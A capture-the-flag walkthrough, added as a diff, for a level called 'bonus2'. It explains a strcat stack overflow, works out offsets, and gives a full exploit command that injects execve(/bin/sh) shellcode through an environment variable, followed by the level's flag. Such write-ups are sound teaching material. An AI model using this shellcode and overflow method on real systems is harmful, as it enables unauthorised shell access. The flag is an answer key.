@@ -1,0 +1,94 @@
+# bonus2 Walkthrough
+
+## Vulnerability: Stack Buffer Overflow via strcat in greetuser()
+
+### Binary Analysis
+
+```
+int lang = 0;   // global, 0x8049988
+
+void greetuser(char *buf)      // buf = passed-in stack copy
+{
+    char greeting[72];         // ebp-0x48
+
+    if      (lang == 1) strcpy(greeting, "Hyvää päivää ");  // 18 chars
+    else if (lang == 2) strcpy(greeting, "Goedemiddag! ");  // 13 chars
+    else                strcpy(greeting, "Hello ");          //  6 chars
+
+    strcat(greeting, buf);     // OVERFLOW: no length check
+    puts(greeting);
+}
+
+int main(int argc, char **argv)
+{
+    char buf[76];              // esp+0x50
+
+    memset(buf, 0, 76);
+    strncpy(buf,      argv[1], 40);   // first 40 bytes
+    strncpy(buf + 40, argv[2], 32);   // next  32 bytes
+
+    env = getenv("LANG");
+    if (env) {
+        if      (memcmp(env, "fi", 2) == 0) lang = 1;
+        else if (memcmp(env, "nl", 2) == 0) lang = 2;
+    }
+
+    // copies 76 bytes of buf to esp via rep movsl, then calls greetuser
+    greetuser(buf);
+}
+```
+
+### Stack Layout in greetuser()
+
+```
+greetuser's frame:
+  ebp-0x48  greeting[0]     ← strcat destination
+  ...
+  ebp-0x01  greeting[71]
+  ebp+0x00  saved EBP
+  ebp+0x04  saved EIP       ← target
+  ebp+0x08  buf (argument)  ← strcat source
+```
+
+Distance from `greeting[0]` to saved EIP = **76 bytes**.
+
+### Exploit Logic
+
+With `LANG=fi`, greetuser prepends `"Hyvää päivää "` (**18 chars**) before calling
+`strcat(greeting, buf)`. The remaining space before EIP:
+
+```
+76 - 18 = 58 bytes from buf before reaching saved EIP
+```
+
+`buf` is composed of argv[1] (40 bytes) + argv[2] (32 bytes) = 72 bytes total.
+
+To place EIP at buf[58..61]:
+- `argv[1]` = 40 bytes padding
+- `argv[2]` = 18 bytes padding + 4 bytes address = 22 bytes
+
+### Shellcode Delivery
+
+Stack is **RWE** (executable) and **ASLR is off**.
+
+Put shellcode in the `EGG` environment variable with a 200-byte NOP sled:
+
+```
+EGG = \x90 * 200 + <23-byte execve(/bin/sh) shellcode>
+```
+
+`getenv("EGG")` returns the address of EGG's value on the stack: `0xbffffedd`.
+Target the middle of the NOP sled: `0xbffffedd + 100 = 0xbfffff41`.
+
+### Exploit Command
+
+```bash
+LANG=fi EGG=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") \
+  /home/user/bonus2/bonus2 \
+  $(python -c "print 'A'*40") \
+  $(python -c "import struct; print 'B'*18 + struct.pack('<I', 0xbfffff41)")
+```
+
+### Flag
+
+`71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
